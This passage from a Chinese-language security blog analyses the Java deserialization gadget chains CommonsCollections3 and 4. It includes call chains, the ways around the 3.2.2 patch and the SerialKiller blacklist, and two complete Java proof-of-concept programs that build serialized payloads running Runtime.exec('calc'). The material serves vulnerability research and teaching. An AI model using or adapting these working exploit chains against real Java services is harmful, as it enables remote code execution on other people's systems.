Class[1]=null</code>，符合进入<code>defineTransletClasses</code>的条件</p><p>而<code>PriorityQueue</code>需要 add 两次(这里没有进行 add，而是通过反射直接设置<code>size</code>，因此不受其构造方法的<code>initialCapacity</code>传值影响)，并设置<code>comparator</code>为<code>TransformingComparator</code>实例对象才能成功调用，前面已经分析过了不再赘述</p><h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><h3 id="Pre-2"><a href="#Pre-2" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk1.7 &lt; 8u71</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>              <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                              TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                       <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-2"><a href="#关键类-2" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">TrAXFilter<br>Templates<br>TemplatesImpl<br>InstantiateTransformer <span class="hljs-regexp">//</span>替换InvokerTransformer<br><br>ClassPool<br>CtClass<br>AbstractTranslet<br><br>Transformer<br>ConstantTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure><p>CC3 是 CC1+CC2 的变种，CC2 使用了<code>TemplatesImpl.newTransformer</code>来触发命令执行；而 ysoserial 中 CC3 使用的是<code>TrAXFilter</code>类调用<code>newTransformer</code></p><h3 id="Gadget-2"><a href="#Gadget-2" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="①p-牛简化的链子"><a href="#①p-牛简化的链子" class="headerlink" title="①p 牛简化的链子"></a>①p 牛简化的链子</h4><blockquote><p>在 安全漫谈中记录了如下的结合方式，含 CC2 的<code>TemplateImpl</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>      <span class="hljs-keyword">method</span>.invoke<span class="hljs-literal">()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplateClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br></code></pre></td></tr></table></figure></blockquote><p>CC2 中，使用<code>TransformingComparator</code>去处理<code>new InvokerTransformer(&quot;newTransformer&quot;, null, null)</code></p><p>而 CC3，则改造了 CC1 的数组，<code>new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</code>改为<code>new InvokerTransformer(&quot;newTransformer&quot;, null, null)</code>去执行<code>TemplatesImpl.newTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC3;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3Ezbyp</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates,&quot;_class&quot;,null);</span><br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>        &#125;);<br>        HashMap hashMap = <span class="hljs-keyword">new</span> HashMap();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazyMap);<br><br>        Map proxymap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,  invocationHandler);<br>        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxymap);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(handler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="②TrAXFilter-InstantiateTransformer"><a href="#②TrAXFilter-InstantiateTransformer" class="headerlink" title="②TrAXFilter+InstantiateTransformer"></a>②TrAXFilter+InstantiateTransformer</h4><blockquote><p>ysoserial 的代码，会发现<code>CommonsCollections3</code>和上述代码并不同，没有使⽤到<code>InvokerTransformer</code>。原因是因为：2015 年初，@frohoff 和@gebl 发布了 Talk《Marshalling Pickles: how deserializing objects will ruin your day》，以及 Java 反序列化利⽤⼯具 ysoserial，随后引爆了安全界。</p><p>Apache Commons Collections 官⽅在 2015 年底得知序列化相关的问题后，就在两个分⽀ 上同时发布了新的版本，4.1 和 3.2.2。先看 3.2.2，通过 diff 可以发现，新版代码中增加了⼀个⽅法 FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置 org.apache.commons.collections.enableUnsafeSerialization=true ，即默认情况下会 抛出异常。 这个检查在常⻅的危险 Transformer 类（InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常。</p><p>同时，开发者们⾃然会去找寻⼀种安全的过滤⽅法，类似 SerialKiller 这样的⼯具随之诞⽣。 SerialKiller 是⼀个 Java 反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类。在<code>SerialKiller</code>中就有过滤<code>InvokerTransformer</code>。</p><p>针对此情况<code>ysoserial</code>的 CC3 用<code>InstantiateTransformer</code>替换<code>InvokerTransformer</code>，同时使用了<code>TrAXFilter</code></p></blockquote><p>下面介绍的是 ysoserial 中<code>TrAXFilter</code>类调用<code>newTransformer</code>的方式以及<code>InstantiateTransformer</code></p><h5 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h5><p><code>TrAXFilter</code>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">        TransformerConfigurationException</span><br><span class="hljs-function">    </span>&#123;<br>        _templates = templates;<br>        _transformer = (TransformerImpl) templates.newTransformer();<br>        _transformerHandler = <span class="hljs-keyword">new</span> TransformerHandlerImpl(_transformer);<br>        _useServicesMechanism = _transformer.useServicesMechnism();<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h5><p>chained 如何去触发<code>TrAXFilter</code>的构造方法进而调用<code>newTransformer</code>，CC3 用了一个<code>InstantiateTransformer</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (input <span class="hljs-keyword">instanceof</span> Class == <span class="hljs-keyword">false</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<br>                    <span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br>                        + (input == <span class="hljs-keyword">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));<br>            &#125;<br>            Constructor con = ((Class) input).getConstructor(iParamTypes);<br>            <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>            ...<br></code></pre></td></tr></table></figure><p>这里把<code>input</code>设置<code>TrAXFilter</code>，那么就会在这里实例化的时候调用其构造方法，进而调用<code>TemplatesImpl#newTransformer</code>最后 RCE</p><p>如何调用到这个<code>chainedTransformer</code>是 CC2 中 LazyMap 中实现的，不再赘述~</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC3;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br><br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><span class="hljs-comment">//        setFieldValue(templatesimpl, &quot;_class&quot;, null);</span><br><span class="hljs-comment">//        setFieldValue(templatesimpl, &quot;_tfactory&quot; ,new TransformerFactoryImpl());</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap decorate = (LazyMap) LazyMap.decorate(hm, chainedTransformer);<br><br>        Constructor declaredConstructor = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorate);<br><br>        Map proxymap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandler);<br>        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxymap);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(handler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><h3 id="Pre-3"><a href="#Pre-3" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 4.0</p></blockquote><h4 id="利用链-3"><a href="#利用链-3" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                         <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-3"><a href="#关键类-3" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 